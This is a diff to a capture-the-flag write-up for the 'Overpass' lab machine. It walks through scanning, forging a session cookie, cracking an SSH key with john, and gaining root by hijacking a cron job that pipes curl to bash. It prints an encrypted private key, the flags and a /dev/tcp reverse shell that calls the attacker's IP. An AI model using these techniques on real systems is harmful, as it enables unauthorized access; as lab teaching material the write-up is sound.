@@ -6,7 +6,7 @@ pagination_prev: null
 
 ## Task 1: Overpass
 ### Hack the machine and get the flag in user.txt
-- Let's run a `nmap` scan against the machine.
+Let's run a `nmap` scan against the machine.
 ```
 $ nmap -sC -sV 10.10.114.146
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 18:09 IST
@@ -26,19 +26,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 83.31 seconds
 ```
-- As we can see there are two open ports:
+As we can see there are two open ports:
 
 | Port | Service |
 | ---- | ------- |
 | 22   |      ssh   |
 | 80     | http        |
 
-- Let's visit the machine using our browser.
+Let's visit the machine using our browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/acf8f872-59a3-4055-af28-cefa0b73656d)
 
-- There is nothing of use here.
-- Let's use `gobuster` to perform directory brute forcing.
+There is nothing of use here.
+
+Let's use `gobuster` to perform directory brute forcing.
 ```
 $ gobuster dir -u http://10.10.114.146 -w /usr/share/wordlists/dirb/common.txt 
 ===============================================================
@@ -66,19 +67,19 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 =============================================================== 
 ```
-- Let's go to the `/admin` page.
+Let's go to the `/admin` page.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/5527c743-20b7-4eed-a27f-3363dd8e9764)
 
-- We can view the source code using `CTRL+U`.
+We can view the source code using `CTRL+U`.
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/c49f54a4-1b07-4eeb-b2a5-8f8a8c95a079)
 
-- Let's view the `/login.js` file.
+Let's view the `/login.js` file.
 
 ![5](https://github.com/Knign/Write-ups/assets/110326359/007e22b5-853d-4935-82f1-39bf73994f58)
 
-- In this code, the `login()` function is what is important.
+In this code, the `login()` function is what is important.
 ```js title="login.js"
 async function login() {
     const usernameBox = document.querySelector("#username");
@@ -97,23 +98,24 @@ async function login() {
     }
 }
 ```
-- It takes the username and password from the user and then creates an object `cred` with them.
-- It then checks if the response includes the phrase `Incorrect Credentials`. 
-- If it doesn't, then the session cookie is set to the received value and we are redirected to `/admin`.
-- This is the bug we are going to exploit.
-- Let's go to the `Developer Tools > Storage` tab.
+It takes the username and password from the user and then creates an object `cred` with them.
+It then checks if the response includes the phrase `Incorrect Credentials`. 
+If it doesn't, then the session cookie is set to the received value and we are redirected to `/admin`.
+
+This is the bug we are going to exploit.
+Let's go to the `Developer Tools > Storage` tab.
 
 ![6](https://github.com/Knign/Write-ups/assets/110326359/af7d5aef-3d81-4ac7-afc1-c435ddbd94f9)
 
-- We can create a new cookie using the `+` sign in the right hand corner.
+We can create a new cookie using the `+` sign in the right hand corner.
 
 ![7](https://github.com/Knign/Write-ups/assets/110326359/aede1cc5-3f5b-4b87-8503-353f110929b2)
 
-- Let's refresh the page.
+Let's refresh the page.
 
 ![8](https://github.com/Knign/Write-ups/assets/110326359/bb9d1970-a4ab-4f4b-9d1f-83935db26837)
 
-- We get an encrypted key. Let's save the key to a file called `rsa_key`.
+We get an encrypted key. Let's save the key to a file called `rsa_key`.
 ```
 $ cat rsa_key          
 -----BEGIN RSA PRIVATE KEY-----
@@ -147,11 +149,11 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
 -----END RSA PRIVATE KEY-----
 ```
-- Next using `ssh2john.py`, to create a hash of the encrypted key.
+Next using `ssh2john.py`, to create a hash of the encrypted key.
 ```
 $ /usr/share/john/ssh2john.py rsa_key > hash_key
 ```
-- Let's now use `john` to crack the hash.
+Let's now use `john` to crack the hash.
 ```
 $ john hash_key                                             
 Using default input encoding: UTF-8
@@ -169,11 +171,11 @@ james13          (rsa_key)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-- Let's give the `rsa_key` file elevated permissions.
+Let's give the `rsa_key` file elevated permissions.
 ```
 $ sudo chmod 700 rsa_key
 ```
-- We can now login as `james` using the `rsa_key`.
+We can now login as `james` using the `rsa_key`.
 ```
 $ ssh -i rsa_key james@10.10.114.146
 Enter passphrase for key 'rsa_key': 
@@ -198,12 +200,12 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
 Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
 james@overpass-prod:~$ 
 ```
-- We have to first check the contents in the directory.
+We have to first check the contents in the directory.
 ```
 james@overpass-prod:~$ ls
 todo.txt  user.txt
 ```
-- Let's cat the `user.txt` file.
+Let's cat the `user.txt` file.
 ```
 james@overpass-prod:~$ cat user.txt 
 thm{65c1aaf000506e56996822c6281e6bf7}
@@ -213,8 +215,10 @@ thm{65c1aaf000506e56996822c6281e6bf7}
 thm{65c1aaf000506e56996822c6281e6bf7}
 ```
 
+&nbsp;
+
 ### Escalate your privileges and get the flag in root.txt
-- There was another file, called `todo.txt`. Let's see what is in it.
+There was another file, called `todo.txt`. Let's see what is in it.
 ```
 james@overpass-prod:~$ cat todo.txt 
 To Do:
@@ -225,8 +229,9 @@ To Do:
 > Ask Paradox how he got the automated build script working and where the builds go.
   They're not updating on the website
 ```
-- So we know that the builds are not going to the website.
-- Let's check the CRON jobs.
+So we know that the builds are not going to the website.
+
+Let's check the CRON jobs.
 ```
 james@overpass-prod:~$ cat /etc/crontab 
 # /etc/crontab: system-wide crontab
@@ -246,7 +251,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 # Update builds from latest code
 * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
 ```
-- We have to change the IP address that is mapped to `overpass.thm` to our IP address so that when the `curl overpass.thm/downloads/src/buildscript.sh | bash` command is run, it will run the file hosted by us. 
+We have to change the IP address that is mapped to `overpass.thm` to our IP address so that when the `curl overpass.thm/downloads/src/buildscript.sh | bash` command is run, it will run the file hosted by us. 
 
 ![9](https://github.com/Knign/Write-ups/assets/110326359/a43b4126-4243-42e2-89db-fb5ebe2c7b5b)
 
@@ -257,16 +262,15 @@ $ cd downloads
 $ mkdir src      
 $ cd src      
 ```
-- Now let's create a `buildscript.sh` file.
-- We need to include a reverse shell in it.
+Now let's create a `buildscript.sh` file and include reverse shell code in it.
 
 ![10](https://github.com/Knign/Write-ups/assets/110326359/25f258b3-8084-440e-bc7e-b404afd4dce7)
 
-- Let's restart `apache2`.
-```\
+Let's restart `apache2`.
+```
 sh -i >& /dev/tcp/10.17.48.138/9999 0>&1
 ```
-- Finally we need to listen using `nc`. After a while, we will get the shell.
+Finally we need to listen using `nc`. After a while, we will get the shell.
 ```
 $ nc -nlvp 9999            
 listening on [any] 9999 ...
@@ -274,7 +278,7 @@ connect to [10.17.48.138] from (UNKNOWN) [10.10.114.146] 49412
 sh: 0: can't access tty; job control turned off
 # 
 ```
-- Let's read the `root.txt` file.
+Let's read the `root.txt` file.
 ```
 # ls
 buildStatus
